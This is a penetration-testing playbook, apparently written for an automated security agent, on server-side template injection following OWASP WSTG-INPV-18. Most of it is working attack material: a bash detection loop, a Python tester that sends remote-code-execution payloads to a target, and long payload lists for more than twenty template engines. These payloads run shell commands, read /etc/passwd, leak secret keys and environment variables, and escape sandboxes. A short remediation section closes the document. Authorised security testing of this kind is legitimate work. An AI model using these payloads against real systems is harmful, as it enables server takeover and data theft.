---
name: wstg-inpv-18
description: "Testing for Server-Side Template Injection (SSTI)"
category: input-validation
owasp_id: WSTG-INPV-18
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-inpv-18

## Test ID

WSTG-INPV-18

## Test Name

Testing for Server-Side Template Injection (SSTI)

## High-Level Description

Server-Side Template Injection occurs when user input is embedded in templates in an unsafe manner. Attackers can inject template directives to execute arbitrary code on the server, read files, or access sensitive data. This affects frameworks like Jinja2, Twig, Freemarker, Velocity, and others.

---

## What to Check

- [ ] Template engine detection
- [ ] Sandbox escape
- [ ] Remote code execution
- [ ] File read via templates
- [ ] Blind SSTI
- [ ] Framework-specific payloads

---

## How to Test

### Step 1: Detect Template Engine

```bash
#!/bin/bash
TARGET="https://target.com/page"

echo "[*] Testing for SSTI..."

# Universal detection payloads
PAYLOADS=(
    "{{7*7}}"
    "${7*7}"
    "<%= 7*7 %>"
    "#{7*7}"
    "*{7*7}"
    "@(7*7)"
    "{{7*'7'}}"
    "${{7*7}}"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET?name=$encoded")
    if echo "$response" | grep -q "49"; then
        echo "[VULN] SSTI detected with: $payload"
    fi
done
```

### Step 2: SSTI Vulnerability Tester

```python
#!/usr/bin/env python3
"""
Server-Side Template Injection (SSTI) Tester
"""

import requests
import re

class SSTITester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()
        self.detected_engine = None

    # Detection payloads for different template engines
    DETECTION_PAYLOADS = {
        'Jinja2/Twig': ['{{7*7}}', '{{7*\'7\'}}'],
        'Freemarker': ['${7*7}', '#{7*7}'],
        'Velocity': ['#set($x=7*7)$x', '$class.inspect("java.lang.Runtime")'],
        'Smarty': ['{php}echo 7*7;{/php}', '{7*7}'],
        'ERB': ['<%= 7*7 %>', '<%= system("id") %>'],
        'Mako': ['${7*7}', '<%import os%>${os.popen("id").read()}'],
        'Pebble': ['{{7*7}}', '{% set x=7*7 %}{{x}}'],
        'Thymeleaf': ['[[${7*7}]]', '[(${7*7})]'],
    }

    # RCE payloads by template engine
    RCE_PAYLOADS = {
        'Jinja2': [
            "{{config}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        'Twig': [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{app.request.server.all|join(',')}}",
        ],
        'Freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}',
        ],
        'Velocity': [
            '#set($x="")##$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',
        ],
        'ERB': [
            '<%= system("id") %>',
            '<%= `id` %>',
            '<%= IO.popen("id").readlines() %>',
        ],
        'Mako': [
            '${self.module.cache.util.os.popen("id").read()}',
            '<%import os%>${os.popen("id").read()}',
        ],
        'Thymeleaf': [
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
        ],
    }

    def detect_template_engine(self, param='name'):
        """Detect which template engine is in use"""
        print("\n[*] Detecting template engine...")

        for engine, payloads in self.DETECTION_PAYLOADS.items():
            for payload in payloads:
                try:
                    response = self.session.get(
                        self.url,
                        params={param: payload}
                    )

                    # Check for math evaluation (7*7 = 49)
                    if '49' in response.text and payload not in response.text:
                        print(f"[+] Detected: {engine}")
                        print(f"  Payload: {payload}")
                        self.detected_engine = engine.split('/')[0]
                        self.findings.append({
                            'type': 'SSTI Detected',
                            'engine': engine,
                            'payload': payload,
                            'severity': 'High'
                        })
                        return engine

                except Exception as e:
                    pass

        return None

    def test_rce(self, param='name'):
        """Test for Remote Code Execution"""
        print("\n[*] Testing for RCE...")

        if not self.detected_engine:
            # Try all payloads if engine not detected
            engines_to_test = self.RCE_PAYLOADS.keys()
        else:
            engines_to_test = [self.detected_engine]

        for engine in engines_to_test:
            if engine not in self.RCE_PAYLOADS:
                continue

            for payload in self.RCE_PAYLOADS[engine]:
                try:
                    response = self.session.get(
                        self.url,
                        params={param: payload}
                    )

                    # Check for command execution indicators
                    if 'uid=' in response.text or 'root:' in response.text:
                        print(f"[VULN] RCE achieved with {engine}!")
                        print(f"  Payload: {payload[:60]}...")
                        self.findings.append({
                            'type': 'SSTI RCE',
                            'engine': engine,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                        return True

                    # Check for config/object disclosure
                    if 'SECRET_KEY' in response.text or 'config' in response.text.lower():
                        print(f"[VULN] Config disclosure with {engine}!")
                        self.findings.append({
                            'type': 'SSTI Config Disclosure',
                            'engine': engine,
                            'payload': payload,
                            'severity': 'High'
                        })

                except Exception as e:
                    pass

        return False

    def test_blind_ssti(self, param='name'):
        """Test for blind SSTI via time-based"""
        print("\n[*] Testing blind SSTI...")

        import time

        blind_payloads = [
            # Jinja2
            "{{request.application.__globals__.__builtins__.__import__('time').sleep(5)}}",
            # ERB
            "<%= sleep(5) %>",
            # Freemarker
            "${Thread.sleep(5000)}",
        ]

        for payload in blind_payloads:
            try:
                start = time.time()
                self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=15
                )
                elapsed = time.time() - start

                if elapsed > 4:
                    print(f"[VULN] Blind SSTI detected!")
                    print(f"  Response time: {elapsed:.2f}s")
                    self.findings.append({
                        'type': 'Blind SSTI',
                        'payload': payload,
                        'response_time': elapsed,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SSTI VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SSTI vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'engine' in f:
                    print(f"  Engine: {f['engine']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:60]}...")

    def run_tests(self, param='name'):
        """Run all SSTI tests"""
        self.detect_template_engine(param)
        self.test_rce(param)
        self.test_blind_ssti(param)
        self.generate_report()

# Usage
tester = SSTITester("https://target.com/page")
tester.run_tests()
```

### Step 3: SSTI Payload Reference

```python
# Jinja2 (Python)
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{["id"]|map("system")|join}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines() %>

# Velocity (Java)
#set($runtime=RuntimeClass().getRuntime())$runtime.exec('id')

# Pebble (Java)
{%set cmd='id'%}{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd)}}
```

---

## Tools

| Tool       | Purpose                     |
| ---------- | --------------------------- |
| tplmap     | Automated SSTI exploitation |
| Burp Suite | Manual testing              |
| SSTImap    | SSTI scanner                |

---

## Example Commands/Payloads

```bash
# Universal detection (math evaluates to 49 if vulnerable)
curl -s "https://{target}/page?name=%7B%7B7*7%7D%7D"        # {{7*7}}
curl -s "https://{target}/page?name=%24%7B7*7%7D"           # ${7*7}
curl -s "https://{target}/page?name=%3C%25%3D+7*7+%25%3E"   # <%= 7*7 %>

# Jinja2 RCE
curl -s "https://{target}/page?name=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27id%27).read()%7D%7D"

# Freemarker RCE
curl -s "https://{target}/page?name=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bex(%22id%22)%7D"
```

| Payload | Engine | Detection Pattern |
| --- | --- | --- |
| `{{7*7}}` | Jinja2/Twig | Response contains `49` (payload not reflected literally) |
| `${7*7}` | Freemarker/Mako | Response contains `49` |
| `<%= 7*7 %>` | ERB | Response contains `49` |
| `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | Jinja2 RCE | `uid=` in response |
| `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Freemarker RCE | `uid=` in response |

### Universal Polyglot Detection (triggers an error across nearly every engine)

```bash
curl -s "https://{target}/page?name=%24%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C." # ${{<%[%'"}}%\.
```

### Error-Based Detection (leaks the backend language from a division-by-zero error)

```bash
curl -s "https://{target}/page?name=%7B%7B(1%2F0).zxy.zxy%7D%7D"   # {{(1/0).zxy.zxy}}
```

| Error string in response | Language |
| --- | --- |
| `ZeroDivisionError` | Python |
| `java.lang.ArithmeticException` | Java |
| `ReferenceError` / `TypeError` | NodeJS |
| `Division by zero` / `DivisionByZeroError` | PHP |
| `divided by 0` | Ruby |
| `Arithmetic operation failed` | Freemarker (Java) |

### Boolean-Based Blind Pairs (for engines that hide errors but expose behavior diffs)

```bash
# Pair 1: valid expr vs syntax error
curl -s "https://{target}/page?name=%7B%7B(3*4%2F2)%7D%7D"     # {{(3*4/2)}}  -> renders "6"
curl -s "https://{target}/page?name=%7B%7B3*)2(%2F4%7D%7D"     # {{3*)2(/4}}  -> triggers error/blank
```

Automated scanners: `Hackmanit/TInjA` (polyglot-based, JS/error/boolean aware), `epinna/tplmap`, `vladko312/SSTImap`.

### ASP.NET Razor

```bash
curl -s "https://{target}/page?name=%40(7*7)"   # @(7*7) -> 49
```

| Payload | Purpose |
| --- | --- |
| `@(1+2)` | Basic detection — renders `3` |
| `@{ /* C# or VB.NET code */ }` | Code block — arbitrary C#/VB.NET statements execute server-side (full RCE, since Razor code blocks are compiled and run with the app's privileges) |

### Elixir (EEx / LEEx / HEEx)

```erlang
<%= 7 * 7 %>                                              # Basic detection
<%= File.read!("/etc/passwd") %>                          # Arbitrary file read
<%= elem(System.shell("id"), 0) %>                        # Rendered RCE
<%= [1, 2][elem(System.shell("id"), 0)] %>                # Error-Based RCE
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %>       # Boolean-Based RCE
<%= elem(System.shell("id && sleep 5"), 0) %>              # Time-Based RCE
```

Same payloads (without the `<%= %>` wrapper) also work for LEEx and HEEx when EEx is used as their replacement engine.

### Java — Additional Engines (Java EL, Jinjava, Groovy, SpEL, OGNL)

Freemarker, Velocity, Pebble and Thymeleaf payloads are covered above; these are other common JVM expression/template languages.

```java
// Java EL — detection and RCE
${7*7}
${{7*7}}
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())}

// Jinjava (HubSpot, Java-based Jinja-like syntax) — fixed in HubSpot/jinjava PR #230, still found on old versions
{{'a'.toUpperCase()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"id\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

// Groovy
${9*9}
${"calc.exe".execute()}
${new File('/etc/passwd').text}
${@ASTTest(value={assert java.lang.Runtime.getRuntime().exec("id")}) def x}   // sandbox bypass via AST annotation

// Spring Expression Language (SpEL)
${7*7}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}

// Object-Graph Navigation Language (OGNL) — no braces needed, injected raw or inside ${ }
7*7
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

### JavaScript / Node.js

| Template Name | Payload Format |
| --- | --- |
| EJS, DotJS, UnderscoreJS, Eta, PugJS | `<% %>` / `#{ }` |
| HandlebarsJS, HoganJS, MustacheJS, NunjucksJS, TwigJS, VueJS | `{{ }}` |
| Lodash | `{{= }}` |

```javascript
// Universal NodeJS RCE — works for EJS, DotJS, PugJS, UnderscoreJS, Eta (wrap in the engine's tag)
global.process.mainModule.require("child_process").execSync("id").toString()                                  // Rendered RCE
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString()) // Error-Based RCE
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", {shell:true}).status===0)]["length"]        // Boolean-Based RCE
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()                       // Time-Based RCE

// NunjucksJS specific
{{range.constructor(' return global.process.mainModule.require("child_process").execSync("id") ')()}}

// Handlebars (<4.1.2, <4.0.14, <3.0.7 — GHSA-q42p-pg8m-cqh6)
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}

// Lodash — delimiter depends on options.evaluate, try all three
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}

// Pug
#{root.process.mainModule.require('child_process').spawnSync('id', []).stdout}
```

### PHP — Additional Engines (Blade, Latte)

Twig and Smarty payloads are covered above; the generic PHP universal payloads work on Blade and Latte too.

```php
// Blade (Laravel) — string "id" built from chr() to avoid quote filtering
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}

// Latte
{var $X="POC"}{$X}
{php system('id')}
```

### Python — Additional Engines (Django Templates, Tornado)

Jinja2 and Mako payloads are covered above.

```python
# Django Template Language (much more restricted than Jinja2 — no function calls)
{% csrf_token %}                     # Errors on Jinja2, confirms Django Templates
ih0vr{{364|add:733}}d121r            # Arithmetic without `*` -> ih0vr1097d121r
{% debug %}                          # Debug information leak
{{ messages.storages.0.signer.key }} # Leaks Django's SECRET_KEY
{% include 'admin/base.html' %}      # Confirms/leaks admin site URL

# Tornado
{{7*7}}
{{os.system('id')}}
{%import os%}{{os.system('id')}}
```

### Ruby — Additional Engine (Slim)

ERB, Erubi and Erubis payloads are covered above.

```ruby
#{ 7 * 7 }        # Slim - basic detection
#{ %x|id| }       # Slim - RCE
```

---

## Remediation

```python
# Jinja2 - Use sandboxed environment
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_template)

# Better: Never allow user-controlled templates
# Only allow user data as variables
template = env.get_template('fixed_template.html')
output = template.render(user_data=safe_data)
```

```java
// Freemarker - Disable dangerous classes
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

---

## Risk Assessment

| Finding                | CVSS | Severity |
| ---------------------- | ---- | -------- |
| SSTI with RCE          | 9.8  | Critical |
| SSTI config disclosure | 7.5  | High     |
| SSTI file read         | 7.5  | High     |

---

## CWE Categories

| CWE ID       | Title                                                                 |
| ------------ | --------------------------------------------------------------------- |
| **CWE-1336** | Improper Neutralization of Special Elements Used in a Template Engine |


---

## References

- [OWASP WSTG - WSTG-INPV-18: Testing for Server-side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---

## Checklist

```
[ ] Template engine detected
[ ] RCE payloads tested
[ ] Blind SSTI tested
[ ] Config disclosure tested
[ ] Sandbox escape tested
[ ] Findings documented
```
